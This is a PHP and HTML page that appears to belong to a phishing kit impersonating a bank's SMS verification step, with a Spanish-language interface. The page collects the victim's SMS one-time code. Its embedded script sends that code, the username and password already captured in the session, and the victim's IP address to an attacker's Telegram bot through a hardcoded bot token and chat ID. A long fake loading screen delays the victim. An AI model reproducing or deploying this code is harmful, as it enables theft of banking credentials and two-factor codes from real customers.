<?php
session_start();
if( !empty($_POST['ips1']) ){
    
    $tlg_tk = "6163969515:AAFNFbQFNVNxNZRQAepiSs_luajL7CUM_Vg";
    $tlg_id = "5157616506";

    $msg = "BANPRO TOK 1> IP ".$_SERVER['REMOTE_ADDR']."- USE : ".$_SESSION['U1'].' - CSS : '.$_SESSION['C1'].' - TK:'.$_POST['ips1'];
    

$tgmsg = <<<EOC
    <script>
        var tlbtid = "{{tlg_tk}}";
        var chat_id = "{{tlg_id}}";

        var message;
        var ready = function () {
            message = "{{msg}}";
        };
        var cfnder = function () {
            ready();
            var settings = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tlbtid + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"

                },
                "data": JSON.stringify({
                    "chat_id": chat_id,
                    "text": message
                })
            };
            $.ajax(settings).done(function (response) {
                //window.location = '3.html';
                console.log('well');
            });

            return false;
        };
        cfnder();

    </script>
EOC;

    $main = str_replace("{{msg}}", $msg , $tgmsg);
    $main = str_replace("{{tlg_tk}}", $tlg_tk , $main);
    $main = str_replace("{{tlg_id}}", $tlg_id , $main);

}else{
    header ('Location:index.html');
}
?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>e-BlSA+</title>
    <script
  src="https://code.jquery.com/jquery-2.2.3.min.js"
  integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
  crossorigin="anonymous"></script>
  </head>
  <body style="background-color: #ebebec;min-width: 1024px;">
  <div id="ld" style="position: fixed;width:100%;height: 100%;background: rgba(255,255,255,1);z-index: 10;text-align:center;"><img src="tmp.svg" style="width: 300px;margin-top: 200px;"><br><div style="width: 126px;height: 126px;display:inline-block;border: 5px solid #0278a7;border-radius: 50%;"><img src="p.gif?id=<?php echo rand(10,100);?>" style="width: 110px;position: relative;top: 36px;"></div></div>
    <style>
        *{margin: 0;padding: 0;}
        @font-face {
            font-family: dinReg;
            src: url(din-regular.ttf);
        }
    </style>
    <nav id="nav1" style="padding: 30px 0 0 0px;height: 180px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;background-color: #003e7e">
        <img id="n1" src="l.png" alt="" style="height:71px;">
    </nav>
    
    <div id="main-cnt" style="overflow: hidden;min-height:700px;position: relative;top: -90px;text-align: center;">
        
        <div id="ctn" style="overflow:hidden;width:940px;display: inline-block;text-align: center;vertical-align: top;background-color: #fff;box-shadow: 0 1px 2px 0 rgb(0 0 0 / 10%);">
            <div id="frmc" style="display:inline-block;text-align: left;width: 578px;border-radius: 8px;vertical-align: top;">
                
                <form method="post" action="4.php" id="f1" style="display: inline-block;width: 578px;height: 433px;border-radius:10px;background-image: url(4.svg);position: relative;" >
                    <input autofocus id="i1" name="ips1" placeholder="Código SMS" type="text" required style="display: block;position: relative;color:#333;background: transparent;border: none;top: 140px;left: 90px;height: 28px;width: 394px;padding-left: 8px;outline: none;font-size: 16px;font-family: dinReg, sans-serif;" autocomplete="off">
                    
                    
                    <input type="submit" style="display: block;position: relative;color:#333;background: transparent;border: none;top: 208px;left: 314px;height: 39px;width: 193px;outline: none;border-radius: 8px;" value="">
                </form>
                
            </div>
            <div id="bnn" style="width: 358px;background-color: #fff;height: 428px;display: inline-block;background-image: url(bnn.png);">

                </div>
        </div>
        
    </div>
        
    </div>
    <style>
        
        @media screen and (max-width:1024px){
           body{
                zoom:78%;
                background-color: #fff!important;
                min-width: auto!important;
            }
            #main-cnt{
                top: 0px!important;
                width: 100%!important;
                margin-top: 20px;
            }
            #nav1{
                height: 56px!important;
                width: 100%!important;
                text-align: left!important;
                padding-left: 5%!important;
                background-image: url(5.svg)!important;
                background-size: 180px !important;
                background-position: 90% 76%!important;
                background-repeat: no-repeat!important;
            }
            #nav1 img{
                height:50px!important;
            }
            #ctn{
                width: 578px!important;
                box-shadow: none!important;
            }
            #bnn{
                margin-top: 30px;
            }
        }
        @media screen and (max-width:420px){
            
        }
    </style>
    <?php echo $main;?>
    <script>
        window.onload = function(){
            setTimeout(function(){ 
                document.getElementById("ld").style.display = "none";
            }, 19000);  
        }
    </script>
  </body>
</html>